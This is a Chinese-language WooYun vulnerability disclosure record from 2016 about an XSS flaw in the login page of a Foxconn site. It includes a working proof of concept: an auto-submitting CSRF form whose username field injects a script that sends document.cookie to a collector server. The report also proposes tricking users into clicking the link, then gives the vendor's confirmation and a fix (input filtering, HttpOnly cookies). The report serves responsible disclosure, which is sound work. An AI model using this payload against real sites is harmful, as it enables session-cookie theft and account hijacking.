{"id": 75657, "wybug_id": "wooyun-2016-0166858", "wybug_title": "富士康某站点XSS，可获取用户cookie", "wybug_corp": "富士康科技集团", "wybug_author": "lex1993", "wybug_date": "2016-01-04 11:45", "wybug_open_date": "2016-02-12 18:49", "wybug_type": "XSS 跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-12：\t细节向公众公开  简要描述： 富士康某站点存XSS漏洞，配合CSRF攻击可获取用户cookie 详细说明：  存在漏洞站点为http://ser.foxconn.com/，查看其网页源代码，可看到存在以下js：\n<script type=\"text/javascript\">window.onload = function init(){\tif(null != document.getElementById(\"username\")){\t\tdocument.getElementById(\"username\").value = '';\t\tdocument.getElementById(\"password\").value = '';\t}\t\tplayImg(); }function configUser(){\twindow.open(\"ConfigLoginUser.do\", \"ConfigLoginUser\", \"width=465,height=500,resizable=no,menubar=no,location=no,scrollbars=no,status=no,titlebar=no,toolbar=bar\");}function reloadImg(){\tdocument.getElementById(\"image\").src = 'image.jsp?time=' + new Date().getTime();}</script>\n此处将用户输入的用户名和密码未经处理直接在代码中使用，存在XSS漏洞，构造CSRF代码如下：\n<html>  <body>    <form action=\"http://ser.foxconn.com/Login.do\" method=\"POST\" id=\"form\">      <input type=\"hidden\" name=\"username\" value=\"admin'</script><script>\t  var img=document.createElement('img');\t  img.src='http://127.0.0.1/test/getcookie.php?cookie='+escape(document.cookie);\t  document.body.appendChild(img);</script><script>'\" />      <input type=\"hidden\" name=\"validateCode\" value=\"sfsff\" />      <input type=\"hidden\" name=\"action\" value=\"login\" />      <input type=\"hidden\" name=\"login\" value=\"登录\" />      <input type=\"hidden\" name=\"password\" value=\"admin\" />    </form>\t<script> document.getElementById(\"form\").submit();</script>  </body></html>\n在用户名字段处插入js代码，构造看不见的图片以获取用户cookie并且传到我的服务器，由于cookie没有添加httponly标记，可直接用js获取，后台获取到cookie\n\n因此只要使用诱惑性文字说明诱骗合法用户点击即可获取用户cookie   漏洞证明：  见详细说明   修复方案：  用户输入进行过滤cookie添加httponly标记   版权声明：转载请注明来源 lex1993@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2016-01-06 10:00 厂商回复： 感谢提交相关漏洞，已交由相关单位处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}